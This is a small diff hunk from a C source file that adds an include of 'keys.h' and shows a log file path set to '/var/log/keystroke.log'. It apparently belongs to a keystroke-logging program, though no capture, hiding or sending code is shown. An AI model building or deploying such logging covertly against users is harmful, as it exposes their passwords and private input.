@@ -11,6 +11,7 @@
 #include <stdio.h>
 #include <string.h>
 #include "utils.h"
+#include "keys.h"
 
 FILE *logfile = NULL;
 const char *logfileLocation = "/var/log/keystroke.log";
